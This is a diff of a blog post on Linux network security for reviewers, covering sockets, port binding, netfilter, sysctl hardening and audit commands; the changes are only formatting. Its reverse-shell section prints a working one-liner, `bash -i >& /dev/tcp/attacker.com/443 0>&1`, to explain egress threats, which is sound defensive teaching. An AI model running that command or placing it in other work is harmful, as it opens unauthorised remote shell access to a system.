@@ -1,7 +1,7 @@
 ---
 layout: post
 title: "Linux Security - Networking & Network Security"
-date: 2025-11-20 10:00:00 +0000
+date: 2025-11-17 10:00:00 +0000
 categories: [linux-security]
 tags: [linux-security]
 author: Application Security Engineer
@@ -22,7 +22,6 @@ In Linux, **"Everything is a File"** applies to networking too. A network connec
     * *Example:* Docker CLI talking to the Docker Daemon often uses `/var/run/docker.sock`.
     * *Security Note:* Permissions on socket files matter! If `/var/run/docker.sock` is world-writable, any user can gain root access.
 
----
 
 ## 2. Ports and Binding (The Attack Surface)
 Processes "bind" to a port to listen for incoming data.
@@ -39,7 +38,6 @@ This is the #1 finding in network reviews.
 * **0.0.0.0 (All Interfaces):** The service accepts connections from **anywhere** (WiFi, Ethernet, VPN).
     * *Critical Finding:* A database (MySQL/Redis) bound to `0.0.0.0` without a firewall is exposed to the public internet.
 
----
 
 ## 3. The Kernel Firewall: Netfilter
 Tools like `iptables`, `ufw`, `firewalld`, and `nftables` are just user-space front-ends. The actual firewall logic happens inside the Linux Kernel module called **Netfilter**.
@@ -59,7 +57,6 @@ Tools like `iptables`, `ufw`, `firewalld`, and `nftables` are just user-space fr
 * **Secure:** `Chain INPUT (policy DROP)` -> Whitelist approach (Everything blocked unless explicitly allowed).
 * **Insecure:** `Chain INPUT (policy ACCEPT)` -> Blacklist approach (Everything allowed unless explicitly blocked).
 
----
 
 ## 4. Kernel Network Parameters (sysctl)
 The networking stack behavior is controlled by kernel files in `/proc/sys/net/`.
@@ -71,7 +68,6 @@ The networking stack behavior is controlled by kernel files in `/proc/sys/net/`.
 | `net.ipv4.icmp_echo_ignore_broadcasts` | **1** (Enabled) | Prevents Smurf attacks (DoS amplification). |
 | `net.ipv4.tcp_syncookies` | **1** (Enabled) | Mitigates TCP SYN Flood attacks. |
 
----
 
 ## 5. Reverse Shells (The Intruder's Lifeline)
 In a review, you aren't just looking for open ports (Ingress); you look for suspicious **outgoing** connections (Egress).
@@ -81,7 +77,6 @@ In a review, you aren't just looking for open ports (Ingress); you look for susp
     * *Command:* `bash -i >& /dev/tcp/attacker.com/443 0>&1`
     * *Why it works:* Most Linux servers allow unrestricted outbound traffic to port 443 (HTTPS).
 
----
 
 ## 6. Audit & Hunting Commands
 
@@ -94,25 +89,24 @@ ss -tulpn
 
 Look for: Services listening on 0.0.0.0 that should be 127.0.0.1.
 
-## 2. List Open Files (Network Mode): Find exactly which files/libraries a network process is using.
+**2. List Open Files (Network Mode): Find exactly which files/libraries a network process is using.**
 ```bash
 # -i (internet files), -n (numeric)
 lsof -i -n -P
 ```
 
-3. Check Firewall Rules:
+**3. Check Firewall Rules:**
 ```bash
 iptables -L -v -n
 # OR
 nft list ruleset
 ```
 
-## 4. Check for Promiscuous Mode: If an interface is in "PROMISC" mode, it might be sniffing traffic on the network.
+**4. Check for Promiscuous Mode: If an interface is in "PROMISC" mode, it might be sniffing traffic on the network.**
 
 ```bash
 ip link show | grep PROMISC
 ```
----
 
 ## 7. Review Checklist
 Exposure: Are internal services (Redis, MongoDB, Admin UI) bound to 0.0.0.0?
